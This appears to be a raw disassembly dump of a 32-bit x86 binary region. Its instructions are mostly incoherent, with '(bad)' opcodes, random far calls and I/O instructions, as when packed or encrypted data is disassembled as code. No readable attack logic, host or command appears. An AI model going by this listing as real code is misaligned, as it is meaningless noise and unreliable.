  404ef2:	retf   0x634
  404ef5:	arpl   WORD PTR [ebx-0x51],di
  404ef8:	mov    al,0xd0
  404efa:	(bad)
  404efe:	sbb    eax,0x3714d505
  404f03:	repz lock in al,0xd3
  404f07:	inc    ecx
  404f08:	mov    gs,WORD PTR [esi+0x2f874967]
  404f0e:	xlat   BYTE PTR ds:[ebx]
  404f0f:	jge    0x404f42
  404f11:	outs   dx,DWORD PTR ds:[esi]
  404f12:	stc    
  404f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f14:	lock shl DWORD PTR [ebp-0x68f82f4c],1
  404f1b:	xchg   edi,eax
  404f1c:	pop    ecx
  404f1d:	xor    eax,0xa24d21c7
  404f22:	les    ebp,FWORD PTR [ebx+0x21]
  404f25:	xlat   BYTE PTR ds:[ebx]
  404f26:	adc    eax,esi
  404f28:	(bad)  
  404f2a:	xor    BYTE PTR [esi+0x8],dl
  404f2d:	sub    BYTE PTR [ebp+0x75],0x87
  404f31:	pop    ebp
  404f32:	nop
  404f33:	mov    dl,0xd9
  404f35:	mov    ebx,0xbc7bf851
  404f3a:	popf   
  404f3b:	neg    BYTE PTR [ebp+0x18305a5b]
  404f41:	mov    ds:0x6dc3805c,eax
  404f46:	and    edi,0xffffffc0
  404f49:	dec    ebx
  404f4a:	into   
  404f4b:	popf   
  404f4c:	fistp  DWORD PTR [eax+0x25]
  404f4f:	cwde   
  404f50:	shl    DWORD PTR [esi],1
  404f52:	jg     0x404f87
  404f54:	add    dl,bh
  404f56:	add    BYTE PTR [edi],dh
  404f58:	adc    dl,dh
  404f5a:	add    al,0x5c
  404f5c:	pop    ss
  404f5d:	fwait
  404f5e:	pop    esi
  404f5f:	push   ecx
  404f60:	(bad)  
  404f61:	out    0x52,eax
  404f63:	call   0x17ba5e77
  404f68:	inc    ebp
  404f69:	mov    bl,0xb6
  404f6b:	push   eax
  404f6c:	xor    DWORD PTR [esi],0x25202a66
  404f72:	js     0x404f5f
  404f74:	push   ecx
  404f75:	jp     0x404f9f
  404f77:	mov    eax,0x825a684b
  404f7c:	sub    DWORD PTR [ecx+esi*8],0x60843246
  404f83:	iret   
  404f84:	and    eax,0x8e30a56f
  404f89:	xchg   esp,eax
  404f8a:	(bad)  [esi]
  404f8c:	push   cs
  404f8d:	das    
  404f8e:	sbb    BYTE PTR [edi-0x4a],dh
  404f91:	pushf  
  404f92:	out    0x0,al
  404f94:	pop    es
  404f95:	adc    al,0x63
  404f97:	fnstsw WORD PTR [ebx-0x68]
  404f9a:	stos   DWORD PTR es:[edi],eax
  404f9b:	pop    ebx
  404f9c:	push   ss
  404f9d:	or     eax,0x9810dc8e
  404fa2:	rcr    BYTE PTR [edx-0x443b7ca9],0x42
  404fa9:	sar    al,cl
  404fab:	bnd jns 0x404f4c
  404fae:	scas   al,BYTE PTR es:[edi]
  404faf:	xchg   ah,dh
  404fb1:	and    al,0xf9
  404fb3:	test   al,0x7c
  404fb5:	and    BYTE PTR [ebp+0x22],bh
  404fb8:	out    dx,al
  404fb9:	arpl   WORD PTR [ebx-0x2a],ax
  404fbc:	mov    ss,WORD PTR [edi+0x28]
  404fbf:	and    BYTE PTR [eax],ch
  404fc1:	lock enter 0xcc22,0x82
  404fc6:	(bad)  
  404fc7:	out    dx,al
  404fc8:	ret    
  404fc9:	daa    
  404fca:	pop    eax
  404fcb:	mov    ds,WORD PTR [ebx]
  404fcd:	xor    BYTE PTR ds:0x78ad72d1,0x5c
  404fd4:	nop
  404fd5:	sti    
  404fd6:	dec    ebp
  404fd7:	mov    ds:0x50476bf2,eax
  404fdc:	jno    0x404feb
  404fde:	dec    edx
  404fdf:	pop    esi
  404fe0:	pushf  
  404fe1:	pop    edi
  404fe2:	xor    ch,BYTE PTR [edx+0x48]
  404fe5:	cmp    al,0x52
  404fe7:	add    eax,DWORD PTR [esi+0x7e]
  404fea:	arpl   WORD PTR [edx],ax
  404fec:	mov    eax,ds:0x26f52d07
  404ff1:	fmul   QWORD PTR [ecx+0x9]
  404ff4:	xchg   ebx,eax
  404ff5:	call   0xe3f4:0xbaf63d5a
  404ffc:	fcomp  DWORD PTR ds:0x63dcada2
  405002:	or     bl,ch
  405004:	add    DWORD PTR [esi+0x73],esp
  405007:	bound  ecx,QWORD PTR [eax-0x15233368]
  40500d:	ret    
  40500e:	arpl   WORD PTR [ebx-0x6c0b890b],ax
  405014:	dec    eax
  405015:	cli    
  405016:	and    BYTE PTR [ebp+0x5c],cl
  405019:	(bad)  
  40501b:	or     DWORD PTR [ecx-0x5a],esp
  40501e:	test   BYTE PTR [eax+0x5c05d93e],dl
  405024:	stc    
  405025:	sbb    DWORD PTR [esi-0x4e5d231e],esp
  40502b:	or     eax,DWORD PTR [esi]
  40502d:	ds call 0xcdad:0xcac2b352
  405035:	cs mov dl,0x4d
  405038:	out    dx,eax
  405039:	test   al,0x1d
  40503b:	aas    
  40503c:	xchg   ebx,eax
  40503d:	ins    BYTE PTR es:[edi],dx
  40503e:	cmc    
  40503f:	repnz retf 0xc689
  405043:	out    dx,eax
  405044:	mov    ecx,0x122e47a4
  405049:	hlt    
  40504a:	outs   dx,DWORD PTR ds:[esi]
  40504b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40504c:	cli    
  40504d:	sbb    BYTE PTR [ecx-0x7ba3cfe1],bl
  405053:	repz adc bl,BYTE PTR [ecx+0x4d]
  405057:	xor    ebx,edx
  405059:	pop    es
  40505a:	repz or al,0x87
  40505d:	mov    edx,0x3f41d63f
  405062:	dec    esi
  405063:	inc    esp
  405064:	shr    BYTE PTR [edx],1
  405066:	ret    0xcade
  405069:	xor    BYTE PTR [ebx+0x4b],al
  40506c:	xor    dl,cl
  40506e:	cwde   
  40506f:	outs   dx,DWORD PTR ds:[esi]
  405070:	xchg   BYTE PTR [ecx],bl
  405072:	imul   edx,DWORD PTR [eax+0x3a],0x1790e2c6
  405079:	in     eax,dx
  40507a:	lods   eax,DWORD PTR ds:[esi]
  40507b:	in     al,0xf8
  40507d:	push   0x9eb6a603
  405082:	xor    dl,BYTE PTR [edi-0x2]
  405085:	sahf   
  405086:	adc    BYTE PTR [eax-0x28db4542],dl
  40508c:	inc    edi
  40508d:	jae    0x40502a
  40508f:	xchg   ebx,eax
  405090:	push   ebx
  405091:	and    dh,dh
  405093:	js     0x405066
  405095:	mov    eax,0x4703a96e
  40509a:	mov    ah,0xe2
  40509c:	lahf   
  40509d:	and    ah,BYTE PTR [eax-0x67]
  4050a0:	dec    esi
  4050a1:	pop    esi
  4050a2:	cmp    eax,0x1e1da608
  4050a7:	sbb    ebx,DWORD PTR [edi]
  4050a9:	dec    eax
  4050aa:	xor    eax,0xf7e0a4a8
  4050af:	cli    
  4050b0:	imul   edi,DWORD PTR [edx+ebx*2-0x31],0xffffff97
  4050b5:	xor    eax,0x32313320
  4050ba:	jge    0x405096
  4050bc:	add    ch,BYTE PTR [eax-0x729818a8]
  4050c2:	ja     0x405085
  4050c4:	aaa    
  4050c5:	pop    edx
  4050c6:	leave  
  4050c7:	sub    eax,0x80d46969
  4050cc:	dec    ebx
  4050cd:	ficom  WORD PTR [ebp+0x4d]
  4050d0:	jl     0x4050fd
  4050d2:	push   ecx
  4050d3:	pop    esp
  4050d4:	sub    al,0xe
  4050d6:	cmp    BYTE PTR [esi-0x75a1da0a],al
  4050dc:	aas    
  4050dd:	imul   edi,DWORD PTR [ebx-0x40e13b7d],0x3
  4050e4:	mov    bh,al
  4050e6:	mov    eax,ds:0x4c99eab1
  4050eb:	ror    DWORD PTR [ecx],0xd3
  4050ee:	pop    esp
  4050ef:	fcom   QWORD PTR [ebp-0x27]
  4050f2:	imul   eax,edi,0xffffffe8
  4050f5:	inc    ebx
  4050f6:	adc    bh,0x54
  4050f9:	in     al,0x34
  4050fb:	xor    edi,DWORD PTR [eax]
  4050fd:	jg     0x405125
  4050ff:	or     BYTE PTR [edi+0x72],bl
  405102:	jecxz  0x40511f
  405104:	outs   dx,BYTE PTR ds:[esi]
  405105:	mov    esi,0xbbb77a9b
  40510a:	mov    esp,0x469b89bb
  40510f:	test   BYTE PTR [ebx-0x53],bl
  405112:	shl    eax,1
  405114:	call   0x3828:0xddf1a375
  40511b:	or     bl,bh
  40511d:	ss mov edx,0x24bfafa3
  405123:	int    0xeb
  405125:	loopne 0x405111
  405127:	adc    DWORD PTR [esi+0x410ead95],ecx
  40512d:	add    DWORD PTR [ecx-0x10],esi
  405130:	mov    ebp,0xb80277ec
  405135:	pop    esi
  405136:	push   ss
  405137:	fadd   DWORD PTR [edi+0x5beba3f9]
  40513d:	pop    ebx
  40513e:	sbb    BYTE PTR [esi],ch
  405140:	je     0x405188
  405142:	xchg   esi,eax
  405143:	bound  edx,QWORD PTR [ebx+0x672b4dbf]
  405149:	(bad)  
  40514a:	bnd jg 0x40512b
  40514d:	push   es
  40514e:	ror    bl,0x7d
  405151:	out    0xce,eax
  405153:	mov    eax,0x55a5dcae
  405158:	sub    al,0x6
  40515a:	xor    eax,0xd33c2bb9
  40515f:	xor    BYTE PTR [edi-0xf64e6b1],bl
  405165:	sar    DWORD PTR [ebp-0x10],cl
  405168:	les    edi,FWORD PTR [esi-0x41b4074b]
  40516e:	lock lock lock or esi,DWORD PTR [edi-0x312c3eb4]
  405177:	lea    esp,[edi]
  405179:	pop    ecx
  40517a:	pop    ds
  40517b:	push   edx
  40517c:	mov    ch,0xd7
  40517e:	popf   
  40517f:	rcl    ecx,1
  405181:	xor    eax,0xef16691c
  405186:	jo     0x405203
  405188:	cs xor eax,0x3a8daed3
  40518e:	sub    BYTE PTR [esp+ebx*1],0x3c
  405192:	call   FWORD PTR [ecx+0x12c3d29f]
  405198:	pop    ecx
  405199:	jns    0x4051a2
  40519b:	inc    edx
  40519c:	jo     0x40513c
  40519e:	xor    ecx,esp
  4051a0:	outs   dx,BYTE PTR ds:[esi]
  4051a1:	das    
  4051a2:	mov    edi,0x5a0561c2
  4051a7:	adc    dl,BYTE PTR [edx-0x63]
  4051aa:	lahf   
  4051ab:	adc    bl,0x4e
  4051ae:	pop    ss
  4051af:	dec    ebp
  4051b0:	rcl    BYTE PTR [ebp+0x6a],0x20
  4051b4:	pop    esi
  4051b5:	fidiv  DWORD PTR ds:0xf50cf26d
  4051bb:	enter  0x305,0xc3
  4051bf:	lods   eax,DWORD PTR ds:[esi]
  4051c0:	push   ss
  4051c1:	pop    eax
  4051c2:	ins    BYTE PTR es:[edi],dx
  4051c3:	xchg   ebp,eax
  4051c4:	arpl   WORD PTR [esi-0x6f],sp
  4051c7:	(bad)  
  4051c8:	(bad)  
  4051ca:	xor    eax,0xcd737073
  4051cf:	in     al,0xa9
  4051d1:	mov    dl,0xf1
  4051d3:	jbe    0x4051c3
  4051d5:	pop    ss
  4051d6:	push   ecx
  4051d7:	ss or  ch,dl
  4051da:	aad    0xc4
  4051dc:	addr16 in eax,0x88
  4051df:	xchg   ebx,eax
  4051e0:	jl     0x4051f8
  4051e2:	stos   DWORD PTR es:[edi],eax
  4051e3:	mov    ebp,DWORD PTR [ecx-0x68bb31d8]
  4051e9:	loop   0x4051f3
  4051eb:	sub    esp,DWORD PTR [edi]
  4051ed:	or     ebp,DWORD PTR [edx+ebp*4+0x6e]
  4051f1:	out    0x93,al
  4051f3:	sub    ebp,DWORD PTR [edi-0x4e1f0203]
  4051f9:	mov    al,ds:0xbb8fc6f5
  4051fe:	cmp    al,0xe3
  405200:	in     al,dx
  405201:	pop    ss
  405202:	outs   dx,BYTE PTR ds:[esi]
  405203:	mov    ah,0xce
  405205:	imul   ebp,DWORD PTR [esi],0x5c9683b8
  40520b:	jp     0x40522b
  40520d:	sub    eax,0xfe3cee5b
  405212:	in     eax,dx
  405213:	inc    eax
  405214:	push   edx
  405215:	or     eax,0x2436278
  40521a:	rcl    cl,cl
  40521c:	pop    ecx
  40521d:	cmp    esi,DWORD PTR [ebx]
  40521f:	xchg   ebp,eax
  405220:	jmp    0x5ad9:0xb027854a
  405227:	or     DWORD PTR [ebx],esp
  405229:	push   ds
  40522a:	ds mov ebx,0x5609dea3
  405230:	mov    esp,0x21f8ce3a
  405235:	and    esi,esi
  405237:	ret    
  405238:	loope  0x4052a5
  40523a:	neg    BYTE PTR [edx*8-0x1e626880]
  405241:	(bad)  
  405242:	rcr    bh,1
  405244:	clc    
  405245:	dec    eax
  405246:	(bad)  
  405247:	sahf   
  405248:	icebp  
  405249:	mov    bl,0xbf
  40524b:	pop    edi
  40524c:	in     al,0xc9
  40524e:	test   DWORD PTR [eax],eax
  405250:	inc    esi
  405251:	aas    
  405252:	cmp    eax,0xe01d0a33
  405257:	mov    WORD PTR [esi+0x5d95325],ss
  40525d:	test   al,0x63
  40525f:	sar    BYTE PTR [esp+ebp*8-0x1795af5d],0xb3
  405267:	test   eax,0xae920ece
  40526c:	call   0x968c:0x964db70d
  405273:	xor    DWORD PTR [eax+0x7aef66a1],esi
  405279:	(bad)  
  40527a:	jle    0x4052b2
  40527c:	frstpm(287 only) 
  40527e:	cmp    BYTE PTR [eax+ecx*4],cl
  405281:	test   al,0x1
  405283:	lds    edi,FWORD PTR [esi+0x1dbb8a13]
  405289:	mov    al,0xcc
  40528b:	retf   0x57c7
  40528e:	and    bl,cl
  405290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405291:	fist   WORD PTR [esi+ecx*8+0x7d]
  405295:	xchg   ecx,eax
  405296:	push   ecx
  405297:	hlt    
  405298:	aam    0x6d
  40529a:	out    0x7a,al
  40529c:	jle    0x4052ff
  40529e:	pop    esp
  40529f:	cmp    BYTE PTR [eax+0x5f468ef8],dh
  4052a5:	dec    edx
  4052a6:	cs pop ss
  4052a8:	mov    esp,0x207b980d
  4052ad:	jo     0x405265
  4052af:	cmp    bl,BYTE PTR [ebp-0x7]
  4052b2:	test   al,0xfc
  4052b4:	sbb    eax,0xe41a65c8
  4052b9:	in     al,dx
  4052ba:	jmp    0x4052a1
  4052bc:	xchg   ebp,eax
  4052bd:	xor    eax,0x6f262882
  4052c2:	idiv   DWORD PTR [ebx+0x3]
  4052c5:	test   eax,0x199ffe20
  4052ca:	adc    al,0x68
  4052cc:	cmp    esi,DWORD PTR [edi+0x45df4a6b]
  4052d2:	pop    ds
  4052d3:	cs (bad) 
  4052d5:	sbb    eax,0xc64c59f2
  4052da:	fimul  WORD PTR [esi]
  4052dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052dd:	ret    0x3552
  4052e0:	daa    
  4052e1:	inc    eax
  4052e2:	xchg   esp,eax
  4052e3:	out    dx,eax
  4052e4:	inc    edi
  4052e5:	jne    0x405306
  4052e7:	inc    ecx
  4052e8:	call   0x4d69c8f5
  4052ed:	sbb    DWORD PTR [ecx-0x554818c4],ecx
  4052f3:	scas   al,BYTE PTR es:[edi]
  4052f4:	mov    edi,0xa90a341b
  4052f9:	cmovp  esp,DWORD PTR [esi-0x5f]
  4052fd:	push   ebx
  4052fe:	xor    ebx,edx
  405300:	in     eax,0xb5
  405302:	loopne 0x4052e1
  405304:	idiv   ah
  405306:	popa   
  405307:	xor    eax,edi
  405309:	bound  edi,QWORD PTR [edi]
  40530b:	pop    eax
  40530c:	nop
  40530d:	pop    eax
  40530e:	iret   
  40530f:	pop    ebp
  405310:	jae    0x405377
  405312:	stc    
  405313:	rcr    DWORD PTR [edx+0x50df59bf],cl
  405319:	or     DWORD PTR [eax],esi
  40531b:	imul   esp,DWORD PTR [edi],0xc9d81892
  405321:	cwde   
  405322:	mov    cl,0xcc
  405324:	fiadd  WORD PTR [edi]
  405326:	and    bh,al
  405328:	(bad)  
  405329:	ins    BYTE PTR es:[edi],dx
  40532a:	or     DWORD PTR [eax-0x711e0415],edi
  405330:	xchg   esp,eax
  405331:	pop    eax
  405332:	push   es
  405333:	stos   DWORD PTR es:[edi],eax
  405334:	stos   BYTE PTR es:[edi],al
  405335:	loopne 0x405378
  405337:	pop    DWORD PTR [eax-0x104c5f5b]
  40533d:	cdq    
  40533e:	push   es
  40533f:	ins    BYTE PTR es:[edi],dx
  405340:	or     dl,BYTE PTR cs:[eax]
  405343:	into   
  405344:	or     bl,BYTE PTR [esi]
  405346:	push   cs
  405347:	and    ch,BYTE PTR [eax+0x54]
  40534a:	pop    esp
  40534b:	sbb    DWORD PTR [ecx],0x70e1fa8e
  405351:	cwde   
  405352:	out    0x1,eax
  405354:	and    dh,BYTE PTR [edi-0x99acec3]
  40535a:	mov    al,ds:0xbe73b901
  40535f:	ja     0x4053c3
  405361:	aas    
  405362:	test   BYTE PTR [ecx+esi*8-0x425765db],cl
  405369:	or     edx,esp
  40536b:	rcr    DWORD PTR [edi-0x18ad47e4],cl
  405371:	lahf   
  405372:	inc    edi
  405373:	daa    
  405374:	repnz div BYTE PTR [ebp+eiz*4+0x7a]
  405379:	stos   DWORD PTR es:[edi],eax
  40537a:	cmp    DWORD PTR [edi],esi
  40537c:	jns    0x4053f5
  40537e:	or     ah,BYTE PTR [edx-0x22]
  405381:	and    ebx,DWORD PTR [ebx-0x7196ff41]
  405387:	or     al,0x12
  405389:	or     BYTE PTR [ebp+0x761200e],0x85
  405390:	shr    al,1
  405392:	fsub   QWORD PTR [edi-0x13e2aec6]
  405398:	xor    ebx,DWORD PTR [ebx]
  40539a:	(bad)  
  40539b:	xchg   ebp,eax
  40539c:	and    al,0x4a
  40539e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a0:	(bad)  
  4053a1:	(bad)  
  4053a2:	xchg   edx,eax
  4053a3:	adc    eax,0x5431880f
  4053a8:	jns    0x40541a
  4053aa:	ins    DWORD PTR es:[edi],dx
  4053ab:	into   
  4053ac:	or     al,0x38
  4053ae:	repz inc esp
  4053b0:	xchg   ebp,eax
  4053b1:	add    BYTE PTR [edx*4+0x548374b7],cl
  4053b8:	inc    ebx
  4053b9:	push   cs
  4053ba:	jbe    0x405415
  4053bc:	dec    edx
  4053bd:	cld    
  4053be:	mov    BYTE PTR [eax+0x6340959a],0x44
  4053c5:	push   ecx
  4053c6:	jnp    0x40541b
  4053c8:	mov    cl,0x80
  4053ca:	xchg   DWORD PTR [ebx-0x1e4c8ea6],edi
  4053d0:	push   ecx
  4053d1:	xor    ch,dh
  4053d3:	stc    
  4053d4:	jle    0x405426
  4053d6:	sar    cl,0x25
  4053d9:	mov    esi,DWORD PTR [edi+0x6e]
  4053dc:	pop    edx
  4053dd:	push   eax
  4053de:	xlat   BYTE PTR ds:[ebx]
  4053df:	xchg   ebx,eax
  4053e0:	(bad)  
  4053e1:	icebp  
  4053e2:	mov    esi,0x3b3eb6a9
  4053e7:	pop    eax
  4053e8:	stos   BYTE PTR es:[edi],al
  4053e9:	loope  0x405401
  4053eb:	ja     0x4053cc
  4053ed:	icebp  
  4053ee:	cmp    edi,DWORD PTR [edx]
  4053f0:	lods   al,BYTE PTR ds:[esi]
  4053f1:	mov    cl,BYTE PTR [edi]
  4053f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053f4:	cwde   
  4053f5:	jmp    0x405456
  4053f7:	push   ss
  4053f8:	inc    esi
  4053f9:	mov    dh,0x98
  4053fb:	rol    BYTE PTR [edi-0xd],cl
  4053fe:	ja     0x405419
  405400:	adc    ebp,DWORD PTR [ecx-0x58]
  405403:	daa    
  405404:	bound  ebx,QWORD PTR [esi]
  405406:	rol    eax,1
  405408:	stos   BYTE PTR es:[edi],al
  405409:	fnstenv [ebx-0x64]
  40540c:	fidiv  WORD PTR gs:[eax+eiz*2]
  405410:	inc    ebp
  405411:	sbb    esp,edx
  405413:	loope  0x405455
  405415:	test   DWORD PTR [edi],ecx
  405417:	inc    DWORD PTR [eax+0x5a439ab5]
  40541d:	inc    edx
  40541e:	or     BYTE PTR [ebp-0x50],ch
  405421:	cmp    BYTE PTR ds:0x21e5f859,0x88
  405428:	fadd   QWORD PTR [eax+eiz*1+0x63]
  40542c:	mov    ebp,0xac8e6215
  405431:	lea    esi,[edx]
  405433:	mov    ecx,0xd8718139
  405438:	mov    eax,ds:0x3043fc89
  40543d:	jbe    0x405426
  40543f:	lea    ebp,[edx+ecx*1]
  405442:	fcomip st,st(0)
  405444:	inc    ebx
  405445:	sub    esi,DWORD PTR [esi]
  405447:	in     eax,dx
  405448:	daa    
  405449:	ss sbb ah,bh
  40544c:	hlt    
  40544d:	fld    st(7)
  40544f:	shl    DWORD PTR [esp+edi*8+0x3c],0xfa
  405454:	aaa    
  405455:	push   edi
  405456:	clc    
  405457:	rcl    DWORD PTR [ebx+0xb93932],1
  40545d:	xchg   edi,eax
  40545e:	mov    BYTE PTR [eax-0xd],0x59
  405462:	sbb    esi,0x204f4e55
  405468:	fcomip st,st(1)
  40546a:	aaa    
  40546b:	neg    DWORD PTR [ecx]
  40546d:	ja     0x40548c
  40546f:	aas    
  405470:	sub    eax,0x890ab1b6
  405475:	dec    esi
  405476:	icebp  
  405477:	lock das 
  405479:	xor    al,0xf2
  40547b:	and    ebp,DWORD PTR [esi-0x46]
  40547e:	retf   
  40547f:	int3   
  405480:	and    ecx,DWORD PTR [ebx]
  405482:	pop    ds
  405483:	fs mov ebx,edx
  405486:	xlat   BYTE PTR ds:[ebx]
  405487:	xchg   ebx,eax
  405488:	and    ch,BYTE PTR [ebp+0x3bc99ef5]
  40548e:	sub    eax,0xd0761e8d
  405493:	push   edi
  405494:	push   ss
  405495:	add    DWORD PTR [esi-0x4e27f943],0x6ba21ee3
  40549f:	pusha  
  4054a0:	pushf  
  4054a1:	sar    DWORD PTR [ecx-0x1b],1
  4054a4:	sub    BYTE PTR [eax+edx*2+0x821c89d],0xaf
  4054ac:	mov    dh,0x1f
  4054ae:	pop    ss
  4054af:	lods   al,BYTE PTR ds:[esi]
  4054b0:	js     0x4054d6
  4054b2:	loop   0x405524
  4054b4:	and    dl,BYTE PTR [eax+0xd180d7b]
  4054ba:	dec    esp
  4054bb:	mov    eax,0xa6328ffd
  4054c0:	mov    eax,ds:0xb579fad3
  4054c5:	ins    DWORD PTR es:[edi],dx
  4054c6:	repnz pop ss
  4054c8:	adc    DWORD PTR [ecx+eiz*1+0x18],edx
  4054cc:	xor    ebx,DWORD PTR [ebx]
  4054ce:	xchg   ecx,eax
  4054cf:	add    eax,0x7c73fc60
  4054d4:	and    al,0x88
  4054d6:	push   edi
  4054d7:	mov    al,0x0
  4054d9:	inc    eax
  4054da:	sbb    eax,0x31ae6387
  4054df:	add    dh,BYTE PTR [ebx+0x6f8706ce]
  4054e5:	push   ss
  4054e6:	dec    ebp
  4054e7:	std    
  4054e8:	add    al,ah
  4054ea:	xor    BYTE PTR [edi-0x57ac0f47],0xc6
  4054f1:	call   0xe97a5ed
  4054f6:	fs lahf 
  4054f8:	lods   al,BYTE PTR ds:[esi]
  4054f9:	inc    ebx
  4054fa:	das    
  4054fb:	into   
  4054fc:	pushf  
  4054fd:	pusha  
  4054fe:	sar    BYTE PTR [ecx-0x2e],1
  405501:	mov    esi,0xfe9e5e27
  405506:	dec    edi
  405507:	xchg   ebp,eax
  405508:	adc    edx,ebx
  40550a:	dec    ebp
  40550b:	inc    eax
  40550c:	xor    ebp,eax
  40550e:	mov    ds:0xd6cacc58,eax
  405513:	ror    BYTE PTR [eax-0x3fdd33e2],1
  405519:	mov    bx,es
  40551c:	push   0xf
  40551e:	(bad)  [esi-0x7d]
  405521:	(bad)  
  405522:	sub    al,0x99
  405524:	into   
  405525:	ins    BYTE PTR es:[edi],dx
  405526:	mov    gs,eax
  405528:	js     0x405530
  40552a:	rcl    BYTE PTR [ebx+0x220be291],1
  405530:	fs ret 
  405532:	faddp  st(7),st
  405534:	sar    DWORD PTR [edi-0x6bf00499],cl
  40553a:	rcr    BYTE PTR [eax],cl
  40553c:	sbb    bh,BYTE PTR [ecx-0x2adc345e]
  405542:	bound  ecx,QWORD PTR [edx+0x6b]
  405545:	fldenv [ebp+ebx*4+0x6b16dd80]
  40554c:	aam    0x1a
  40554e:	sub    al,0x84
  405550:	jns    0x4055b0
  405552:	dec    edx
  405553:	jg     0x4055b4
  405555:	xchg   BYTE PTR [esi-0xe],ah
  405558:	fldenv [ecx-0x11493d8]
  40555e:	mov    cl,0xa7
  405560:	call   0x9c64e45
  405565:	mov    BYTE PTR ds:0x1969be88,dl
  40556b:	jne    0x40558c
  40556d:	and    esi,esp
  40556f:	add    eax,0x24fc73a5
  405574:	pop    ecx
  405575:	ss mov bl,0x2a
  405578:	not    ah
  40557a:	jl     0x405574
  40557c:	sti    
  40557d:	pusha  
  40557e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40557f:	cmp    al,0x0
  405581:	adc    eax,0xcd206932
  405586:	pop    edx
  405587:	inc    edx
  405588:	dec    ebp
  405589:	call   0xf367817
  40558e:	push   ss
  40558f:	xchg   ebx,eax
  405590:	dec    ebp
  405591:	retf   0x40e6
  405594:	mov    dl,0x58
  405596:	pop    edi
  405597:	mov    bl,0xbe
  405599:	xor    ecx,edx
  40559b:	adc    DWORD PTR [edx-0x44],0xffffffee
  40559f:	nop
  4055a0:	pop    ebp
  4055a1:	clc    
  4055a2:	in     eax,dx
  4055a3:	sar    DWORD PTR [edi+0x53],cl
  4055a6:	fist   WORD PTR [edx+0x555e86b5]
  4055ac:	rcl    al,1
  4055ae:	in     al,dx
  4055af:	push   esp
  4055b0:	retf   
  4055b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055b2:	call   0xd7df:0x490ccc7c
  4055b9:	sbb    eax,0x4a33912f
  4055be:	pop    ss
  4055bf:	push   esi
  4055c0:	je     0x4055bc
  4055c2:	mov    eax,ds:0x83c5f404
  4055c7:	dec    edx
  4055c8:	loope  0x405604
  4055ca:	push   esp
  4055cb:	pop    esp
  4055cc:	mov    bl,0x24
  4055ce:	add    ebx,DWORD PTR [ebp-0x6b]
  4055d1:	popa   
  4055d2:	jecxz  0x405629
  4055d4:	mov    ds:0xde3d5a86,al
  4055d9:	and    bl,al
  4055db:	lahf   
  4055dc:	fstp   DWORD PTR [edi]
  4055de:	lock dec ebx
  4055e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055e1:	cld    
  4055e2:	out    dx,al
  4055e3:	into   
  4055e4:	sbb    DWORD PTR [ebx],ebx
  4055e6:	xchg   ecx,eax
  4055e7:	jb     0x405609
  4055e9:	dec    esi
  4055ea:	std    
  4055eb:	sbb    eax,0xcb40aa1c
  4055f0:	enter  0x53c5,0x49
  4055f4:	pop    ss
  4055f5:	(bad)  
  4055f6:	ja     0x405667
  4055f8:	mov    dh,0xd2
  4055fa:	repnz stos BYTE PTR es:[edi],al
  4055fc:	or     eax,0x727cab50
  405601:	adc    BYTE PTR [esi],0x72
  405604:	jmp    DWORD PTR [ecx-0x211daf0b]
  40560a:	mov    eax,ecx
  40560c:	aas    
  40560d:	hlt    
  40560e:	loopne 0x405637
  405610:	adc    cl,BYTE PTR [eax]
  405612:	inc    esp
  405613:	pop    ds
  405614:	sbb    edi,DWORD PTR [esi+0x2]
  405617:	xchg   DWORD PTR [edx-0x74c47464],esp
  40561d:	xchg   esp,eax
  40561e:	pop    es
  40561f:	xor    ebp,DWORD PTR [edi]
  405621:	sete   BYTE PTR [ebx+0x465f235f]
  405628:	pop    edi
  405629:	push   edx
  40562a:	test   eax,0x3feb4154
  40562f:	xlat   BYTE PTR ds:[ebx]
  405630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405631:	shl    ebp,0x7f
  405634:	mov    dl,0x7
  405636:	daa    
  405637:	leave  
  405638:	les    edi,FWORD PTR [esi+0x59]
  40563b:	jno    0x405636
  40563d:	inc    esi
  40563e:	jp     0x405637
  405640:	adc    ebx,DWORD PTR [ebp+0x1a1ef63b]
  405646:	(bad)  
  405647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405648:	fst    st(7)
  40564a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40564c:	lahf   
  40564d:	xor    BYTE PTR [edi+0x6369772c],0xc5
  405654:	mov    edx,DWORD PTR [ebx+0x32]
  405657:	mov    BYTE PTR [edi],ah
  405659:	jbe    0x4055f2
  40565b:	cwde   
  40565c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40565e:	and    bh,BYTE PTR [edx-0x6e]
  405661:	in     al,0xf6
  405663:	shl    BYTE PTR [edx-0x49],0xe
  405667:	push   edx
  405668:	xchg   BYTE PTR [ecx-0xdfcb002],ah
  40566e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  405670:	lock jecxz 0x405664
  405673:	and    eax,0x4813883e
  405678:	nop
  405679:	add    BYTE PTR [ebp-0x39],dh
  40567c:	or     DWORD PTR [edi+ebp*4+0x713d1ba5],0xffffffca
  405684:	mul    BYTE PTR [ebx]
  405686:	cmp    DWORD PTR [esi],edi
  405688:	mov    ecx,0x14b8e20a
  40568d:	stos   BYTE PTR es:[edi],al
  40568e:	xor    ebx,ebp
  405690:	push   esp
  405691:	adc    BYTE PTR [ebx+esi*1],al
  405694:	mov    BYTE PTR [edx],bh
  405696:	mov    ds:0xdd1b6c2,eax
  40569b:	mov    dl,0xa9
  40569d:	test   DWORD PTR [ebp+0x2],ebx
  4056a0:	pop    ebp
  4056a1:	cmp    BYTE PTR [edx+eiz*8-0x18],ch
  4056a5:	imul   esi,ebx,0x18
  4056a8:	fcom   DWORD PTR [ebx+0x3d]
  4056ab:	rol    BYTE PTR [ebp+0x4d],cl
  4056ae:	mov    BYTE PTR [ebp-0x80],bh
  4056b1:	xchg   ebx,eax
  4056b2:	test   al,0xa7
  4056b4:	ja     0x405710
  4056b6:	adc    bh,BYTE PTR [esi+ecx*2-0x12a4f822]
  4056bd:	push   ds
